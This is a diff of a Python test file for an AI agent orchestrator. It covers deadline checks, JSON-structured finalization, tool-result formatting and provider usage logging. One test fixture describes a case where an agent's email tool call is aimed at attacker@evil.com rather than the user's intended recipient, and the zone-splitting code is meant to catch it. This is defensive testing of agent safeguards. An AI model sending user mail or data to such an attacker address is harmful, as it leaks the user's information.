@@ -8,10 +8,10 @@ full agentic loop with native function calling.
 import asyncio
 import json
 import time
+from types import SimpleNamespace
 from unittest.mock import AsyncMock, MagicMock
 
 import pytest
-
 from backend.agent.agent_loop import (
     FORCED_WEB_SEARCH_CLASSIFIER_PROMPT,
     AgentOrchestrator,
@@ -43,7 +43,8 @@ from backend.agent.finalization import (
 )
 from backend.agent.llm_caller import LLMCaller
 from backend.agent.loop import LoopState
-from backend.llm.call_factory import LLMResponse, LLMToolCall
+from backend.llm.call_factory import AttemptRecord, LLMResponse, LLMToolCall
+from backend.llm.capabilities import CapabilitySupport, LlmResponseFormat
 from backend.llm.structured_response import StructuredAssistantContent
 from backend.llm.usage import LLMCallUsage
 from backend.memory.context_builder import ContextEntry, ContextResult
@@ -155,9 +156,7 @@ class TestSplitByZoneWithIntent:
         boss@firma.com but the model targets attacker@evil.com.
         """
         calls = [
-            ToolCall(
-                id="c1", name="email_send", parameters={"to": "attacker@evil.com"}
-            )
+            ToolCall(id="c1", name="email_send", parameters={"to": "attacker@evil.com"})
         ]
         immediate, red = split_by_zone(
             calls,
@@ -256,7 +255,13 @@ class TestBuildToolResultMessages:
         assert len(msgs) == 1
         assert msgs[0]["role"] == "tool"
         assert msgs[0]["tool_call_id"] == "call_1"
-        assert msgs[0]["content"] == "content"
+        assert json.loads(msgs[0]["content"]) == {
+            "data": "content",
+            "invocation_id": "call_1",
+            "original_bytes": 7,
+            "source": "file_read",
+            "truncated": False,
+        }
 
     def test_error_result(self):
         """Verify error result produces role:tool message."""
@@ -271,7 +276,13 @@ class TestBuildToolResultMessages:
             )
         ]
         msgs = build_tool_result_messages(calls, results)
-        assert msgs[0]["content"] == "not found"
+        assert json.loads(msgs[0]["content"]) == {
+            "data": "not found",
+            "invocation_id": "call_2",
+            "original_bytes": 9,
+            "source": "file_read",
+            "truncated": False,
+        }
 
     def test_multiple_results(self):
         """Verify multiple results produce matching messages."""
@@ -475,9 +486,12 @@ class TestFinalAnswerRecovery:
 
         assert covered == ("Ethereum",)  # in the tool result
         # "Solana" appears nowhere; "Ethereum" in the assistant prose does not count
-        assert LLMCaller._current_data_targets_covered_by_tools(
-            [{"role": "assistant", "content": "Ethereum Solana"}], ("Ethereum",)
-        ) == ()
+        assert (
+            LLMCaller._current_data_targets_covered_by_tools(
+                [{"role": "assistant", "content": "Ethereum Solana"}], ("Ethereum",)
+            )
+            == ()
+        )
 
     def test_finalization_accepts_when_target_covered_by_fetch(self):
         """A fetch covering the target clears the guard's rejection (R1, R3)."""
@@ -1195,6 +1209,40 @@ def _make_orchestrator(
 class TestAgentOrchestrator:
     """Tests for the full orchestrator loop."""
 
+    async def test_live_active_deadline_blocks_next_provider_call(self) -> None:
+        """Current foreground elapsed time counts before another native round."""
+        orchestrator = _make_orchestrator()
+        orchestrator.turn_store = SimpleNamespace(
+            get_agent_turn=AsyncMock(return_value={"active_time_ms": 0})
+        )
+        orchestrator._capabilities_resolver = lambda: SimpleNamespace(
+            native_tools=CapabilitySupport.SUPPORTED
+        )
+        expected = MagicMock()
+        orchestrator._commit_structured_failure = AsyncMock(return_value=expected)
+        llm_call = AsyncMock()
+        prepared = SimpleNamespace(
+            run_id="turn-1",
+            obligations=(),
+            request_started_at=time.perf_counter() - 10_000,
+        )
+
+        result = await orchestrator._run_structured_authority_turn(
+            prepared_turn=prepared,
+            session_id="session-1",
+            conversation_id="conversation-1",
+            loop=MagicMock(),
+            llm_call=llm_call,
+            channel="web",
+        )
+
+        assert result is expected
+        llm_call.assert_not_awaited()
+        assert (
+            orchestrator._commit_structured_failure.await_args.kwargs["code"]
+            == "active_deadline_exhausted"
+        )
+
     def test_output_filtered_stays_boolean_when_credentials_found(
         self,
         monkeypatch: pytest.MonkeyPatch,
@@ -1408,6 +1456,85 @@ class TestAgentOrchestrator:
         )
         assert isinstance(resp, AgentResponse)
         assert "Hello" in resp.structured_content.answer
+
+    async def test_structured_direct_answer_always_uses_json_finalization(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """Even an ordinary chat is normalized through the final JSON schema."""
+        from backend.config import reset_settings
+
+        monkeypatch.setenv("BIMEMO_STRUCTURED_FINALIZATION_ENABLED", "true")
+        reset_settings()
+        broker = MagicMock()
+        broker.registry.tool_names = []
+        broker.list_openai_schemas.return_value = []
+        turn_store = AsyncMock()
+        turn_store.get_agent_turn.return_value = {
+            "finalization_id": "final-1",
+            "synthesis_attempts": 0,
+        }
+        turn_store.get_pending_agent_clarification.return_value = None
+        orchestrator = AgentOrchestrator(
+            broker=broker,
+            concurrency=AgentConcurrency(),
+            context_fn=lambda _session_id, **_kwargs: [],
+            turn_store=turn_store,
+        )
+        orchestrator._capabilities_resolver = lambda: SimpleNamespace(
+            native_tools=CapabilitySupport.SUPPORTED,
+            required_native_decision=CapabilitySupport.SUPPORTED,
+            non_streaming_custom_schema=CapabilitySupport.SUPPORTED,
+            max_context_tokens=262_144,
+        )
+        expected = MagicMock()
+        orchestrator._commit_structured_final = AsyncMock(return_value=expected)
+        calls = 0
+
+        async def mock_llm(_messages, *, options=None, phase_override=None):
+            nonlocal calls
+            calls += 1
+            if calls == 1:
+                assert options.response_format is LlmResponseFormat.TEXT
+                assert options.thinking_enabled is None
+                assert options.tool_choice == "auto"
+                assert {
+                    item["function"]["name"] for item in options.tools
+                } >= {"bimemo_ask_user"}
+                return LLMResponse(text="Hello draft")
+            assert phase_override == "Stage 2"
+            assert options.response_format is LlmResponseFormat.JSON_SCHEMA
+            assert options.tools == []
+            return LLMResponse(
+                text=(
+                    '{"answer":"Hello in JSON","suggestions":'
+                    '["Ask another question"]}'
+                )
+            )
+
+        try:
+            response = await orchestrator.process_message(
+                message="Привет",
+                channel="web",
+                llm_call=mock_llm,
+                session_id="session-1",
+                conversation_id="conversation-1",
+                agent_run_id="turn-1",
+            )
+        finally:
+            reset_settings()
+
+        assert response is expected
+        assert calls == 2
+        content = orchestrator._commit_structured_final.await_args.kwargs[
+            "structured_content"
+        ]
+        assert content.answer == "Hello in JSON"
+        assert content.suggestions == ["Ask another question"]
+        assert any(
+            call.kwargs.get("event_type") == "semantic_finish_without_tool"
+            for call in turn_store.append_agent_turn_event.await_args_list
+        )
 
     async def test_tool_execution(self):
         """Verify tool calls are executed."""
@@ -3192,3 +3319,36 @@ class TestAgentOrchestrator:
 
         # System stability: no crashes, all 16 turns completed
         assert len(zone_history) == 16, f"Expected 16 turns, got {len(zone_history)}"
+    async def test_provider_attempt_serializes_dataclass_usage(self):
+        """Provider usage is durable even though LLMCallUsage is not Pydantic."""
+        orchestrator = _make_orchestrator()
+        recorder = SimpleNamespace(record_provider_attempt=AsyncMock())
+        orchestrator.run_event_recorder = recorder
+        usage = LLMCallUsage(prompt_tokens=7, completion_tokens=3, model="test")
+
+        orchestrator._record_provider_attempt(
+            AttemptRecord(phase="Stage 1", attempt=1, usage=usage)
+        )
+        await orchestrator._flush_provider_attempts()
+
+        recorder.record_provider_attempt.assert_awaited_once_with(
+            phase="Stage 1",
+            attempt=1,
+            payload={
+                "error": "",
+                "usage": {
+                    "prompt_tokens": 7,
+                    "completion_tokens": 3,
+                    "prompt_ms": 0.0,
+                    "generation_ms": 0.0,
+                    "total_ms": 0.0,
+                    "model": "test",
+                    "phase": "",
+                    "attempt": 0,
+                    "tool_capable": False,
+                    "tool_used": False,
+                    "context_total": None,
+                    "context_used": None,
+                },
+            },
+        )
